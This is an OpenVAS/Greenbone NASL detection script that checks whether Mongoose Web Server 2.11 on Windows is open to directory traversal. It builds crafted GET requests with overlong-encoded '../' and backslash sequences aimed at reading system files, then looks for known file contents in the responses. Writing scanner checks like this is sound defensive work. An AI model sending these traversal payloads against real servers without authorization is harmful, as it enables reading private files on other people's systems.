CPE = "cpe:/a:cesanta:mongoose";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801533" );
	script_version( "2021-07-07T12:08:51+0000" );
	script_tag( name: "last_modification", value: "2021-07-07 12:08:51 +0000 (Wed, 07 Jul 2021)" );
	script_tag( name: "creation_date", value: "2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Mongoose Web Server <= 2.11 Multiple Directory Traversal Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_mongoose_web_server_http_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "cesanta/mongoose/http/detected", "Host/runs_windows" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "Mongoose Web Server is prone to multiple directory traversal
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends multiple crafted HTTP GET requests and checks the
  responses." );
	script_tag( name: "insight", value: "The flaws are due to an error in validating backslashes in the
  filenames." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Mongoose Web Server version 2.11 on Windows." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15373/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
files = traversal_files( "windows" );
exploits = make_array();
for pattern in keys( files ) {
	file = files[pattern];
	exploits["/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/" + file] = pattern;
	file = str_replace( find: "/", string: file, replace: "\\" );
	exploits["/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\" + file] = pattern;
	file = str_replace( find: "\\", string: file, replace: "%5c" );
	exploits["/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c" + file] = pattern;
	file = str_replace( find: "%5c", string: file, replace: "%c0%5c" );
	exploits["/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c" + file] = pattern;
}
for url in keys( exploits ) {
	pattern = exploits[url];
	if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

